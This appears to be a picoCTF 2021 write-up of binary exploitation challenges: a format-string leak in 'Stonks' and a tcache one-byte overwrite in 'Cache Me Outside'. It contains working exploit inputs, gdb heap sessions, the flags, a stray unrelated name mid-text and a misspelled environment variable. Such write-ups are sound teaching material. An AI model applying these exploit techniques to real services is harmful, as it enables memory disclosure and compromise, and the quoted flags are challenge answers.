# Category: Binary Exploitation

## Stonks

Points: 20

The source code takes us through creating an imaginary stock trading network client. The part that interests us is the function `buy_stonks`, which loads the flag into a char_array and then printf our API token input:

~~~~~c
char *user_buf = malloc(300 + 1);
printf("What is your API token?\n");
scanf("%300s", user_buf);
printf("Buying stonks with token:\n");
printf(user_buf);
~~~~~

This printf call is vulnerable to a format string epxloit, and so we can simply print out values on the stack and see if we can locate the flag string.

Following a guide on pwntools, I was able to create a Python program that sends "%08x"*40 to the server as the API key and then print out the output. The padding parameter `08` is particularly important to get a nicely-formatted hex string.

~~~~~bash
[+] Opening connection to mercury.picoctf.net on port 6989: Done
[*] Viewing Portfolio...
[*] Sending Format String..
%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x
[*] Received data:
081e83f00804b000080489c3f7ecbd80ffffffff00000001081e6160f7ed9110f7ecbdc700000000081e718000000002081e83d0081e83f06f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3538613032356533ffb4007df7f06af8f7ed9440fc411e000000000100000000f7d68be9f7eda0c0f7ecb5c0f7ecb000ffb4f018f7d5958df7ecb5c008048ecaffb4f02400000000f7eedf09

[*] Closed connection to mercury.picoctf.net port 6989
~~~~~~~

When we try to decode this hex string, we notice that the endianess causes a group of every 4 characters to be swapped. We can use CyberChef to swap the endianess and decode the string:

~~~~~text
Output: ð....°..Ã....½ì÷ÿÿÿÿ....`a....í÷Ç½ì÷.....q......Ð...ð...picoCTF{I_l05t_4ll_my_m0n3y_0a853e52}.´ÿøjð÷@.í÷..Aü........é.Ö÷À í÷Àµì÷.°ì÷.ð´ÿ..Õ÷Àµì÷Ê...$ð´ÿ....	ßî÷
~~~~~

flag: picoCTF{I_l05t_4ll_my_m0n3y_0a853e52}

## Cache Me Outside

Points: 70

When we connect to the program via netcat, we see that it prompts us for an address to overwrite:

~~~~~bash
cache_me_outside$ nc mercury.picoctf.net 49825
You may edit one byte in the program.
Address: 0xefff8732
Value: t help you: this is a random string.
~~~~~

Here it didn\'t prompt me to put in a value and instead printed out a string, likely because I was asking for an address outside of the program\'s address space.

When we try to execute the local heapedit program we run into a segmentation fault. This error occured because the program is expecting a different version of libc than what we have on the computer. We can use a tool called `pwninit` (link: <https://github.com/io12/pwninit>) to help us download a linker for the program and patch it automatically. **Note:** Since the `cargo install` method was not working for me, I had to download the pwninit executable from the releases page and called to it from the command line (while also being in the directory containing heapedit). To prevent `pwninit` from patching itself, make sure to specify the executable you want to target with the --bin flag:

`./pwninit --bin heapedit`

We also need to create a file called flag.txt for the program to read into. After that, we can run the program using:

`LD_PREALOAD=./libc.so.6 ./ld-2.27.so ./heapedit`

Running ./heapedit should now trigger the program correctly.

If we open the ELF file in Ghidra\'s decompiler we could see some of the program\'s behavior more clearly:

1. At the start, it reads the contents of "flag.txt" into a supposed char array.
2. The program then allocates 7 chunks of 0x80 (128 bytes), For each chunk, it writes the string "Congrats! Your flag is: " and the contents of the flag file into that chunk.
3. The program then allocates one more chunk of size 0x80 and writes the string: "Sorry! This won't help you: This is a random string."
4. Afterwards, it frees the seventh chunk followed by the last malloc\'ed chunk.
5. It then prompts the user for an integer offset, which it adds to the address of the first chunk, and writes the provided integer value to that chunk.
6. Afterwards, the program malloc one more chunk of 0x80 size and prints the value inside that chunk to standard output.

**Note:** In the code the strings were encoded as hex, like the following:

~~~~~gdb
  *local_88 = 0x5420217972726f53;
  local_88[1] = 0x276e6f7720736968;
  local_88[2] = 0x7920706c65682074;
~~~~~

To figure out what the original value was we have to convert to little-endian formatting, and then decode it from hex to ASCII. (Link to CyberChef recipe: <https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',8,true)From_Hex('Auto')Decode_text('UTF-8%20(65001)'))>

If we now run the program and provide 0 for both the address and value, we can see we still get back "t help you: this is a random string.", which is the second chunk that we freed in step 4.

The reason why we are getting this chunk back is because once the chunk was freed, it was placed into the linked list of "tcache", which is a bin that stores recently freed chunk. As explained here: <https://guyinatuxedo.github.io/29-tcache/tcache_explanation/index.html>, chunks are added to and popped from tcache in a LIFO design, and so it's expected that we would get back the last chunk we freed.

Instead, we would like for the heap manager to give us one of the seven chunks which contains the flag.

First, we can open the program in gdb, set a breakpoint at the first free command and another one at the instruction after the second free, and inspect the heap at those poinds. Following a guide at <https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF/Cache_Me_Outside.md>, I decided to install `gef` script for GDB which allows me to run the nifty command `heap chunks` and `heap bins tcache` to view the chunk and tcache bins, respectively:

First breakpoint:

~~~~~~~~~~gdb
gef➤  heap chunks
Chunk(addr=0x602010, size=0x250, flags=PREV_INUSE)
    [0x0000000000602010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x602260, size=0x230, flags=PREV_INUSE)
    [0x0000000000602260     88 24 ad fb 00 00 00 00 a6 24 60 00 00 00 00 00    .$.......$`.....]
Chunk(addr=0x602490, size=0x1010, flags=PREV_INUSE)
    [0x0000000000602490     66 6c 61 67 7b 74 68 69 73 5f 69 73 5f 6d 79 5f    flag{this_is_my_]
Chunk(addr=0x6034a0, size=0x90, flags=PREV_INUSE)
    [0x00000000006034a0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603530, size=0x90, flags=PREV_INUSE)
    [0x0000000000603530     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x6035c0, size=0x90, flags=PREV_INUSE)
    [0x00000000006035c0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603650, size=0x90, flags=PREV_INUSE)
    [0x0000000000603650     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x6036e0, size=0x90, flags=PREV_INUSE)
    [0x00000000006036e0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603770, size=0x90, flags=PREV_INUSE)
    [0x0000000000603770     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE)
    [0x0000000000603800     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE)
    [0x0000000000603890     53 6f 72 72 79 21 20 54 68 69 73 20 77 6f 6e 27    Sorry! This won']
Chunk(addr=0x603920, size=0x1f6f0, flags=PREV_INUSE)  ←  top chunk
gef➤  heap bins tcache
─────────────────────────── Tcachebins for thread 1 ───────────────────────────
All tcachebins are empty
~~~~~~~~~~

Second Breakpoint:

~~~~~~gdb
gef➤  heap bins tcache
─────────────────────────── Tcachebins for thread 1 ───────────────────────────
Tcachebins[idx=7, size=0x90] count=2  ←  Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE)  ←  Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE) 
~~~~~~

We can see after the free commands there are now two chunks in the tcache bin, where the first chunk in the list is the chunk with the "Sorry! This won't help you: this is a random string." message. 

To exploit the program, we need to find whatever is pointing to that chunk's buffer address and change it. We do so using the `grep` command with escape characters:

~~~~~gdb
gef➤  grep '\\x90\\x38\\x60'
[+] Searching '\x90\x38\x60' in memory
[+] In '[heap]'(0x602000-0x623000), permission=rw-
  0x602088 - 0x602094  →   "\x90\x38\x60[...]" 
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffddd0 - 0x7fffffffdddc  →   "\x90\x38\x60[...]" 
~~~~~~

The entry we're looking for is likely the one at the address 0x602088. We can calculate the input address with the `p/d [variable]` command, which prints a variable as an signed integer:

~~~~~gdb
gef➤  p/d 0x602088 - 0x6034a0
$1 = -5144
~~~~~

Jason Padgett
Since the program allows us to edit one byte, we want to change the value of "\x90" to "\x00" so it will send us to the 0x603800 chunk instead. We could edit other bytes of the address, but this seems the most straightforward.

Altogether, we get the following one-line exploit:

~~~console
grayhimakar@grayhimakar-VirtualBox:~/Documents/2021-picoctf/Binary_Exploitation/cache_me_outside$ ( echo "-5144"; echo -e "\x00";) | nc mercury.picoctf.net 49825
You may edit one byte in the program.
Address: Value: lag is: picoCTF{53be92758865dfd2779fa96526dbd0a3}
~~~

Flag: picoCTF{53be92758865dfd2779fa96526dbd0a3}

## Here's a LIBC

Points: 90